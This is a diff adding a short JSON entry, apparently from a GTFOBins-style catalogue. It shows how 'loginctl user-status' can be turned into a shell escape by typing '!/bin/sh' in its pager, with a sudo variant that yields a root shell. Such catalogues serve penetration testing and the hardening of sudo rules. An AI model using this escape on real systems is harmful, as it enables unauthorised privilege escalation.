@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "loginctl user-status\n!/bin/sh\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo loginctl user-status\n!/bin/sh\n"
+      }
+    ]
+  }
+}
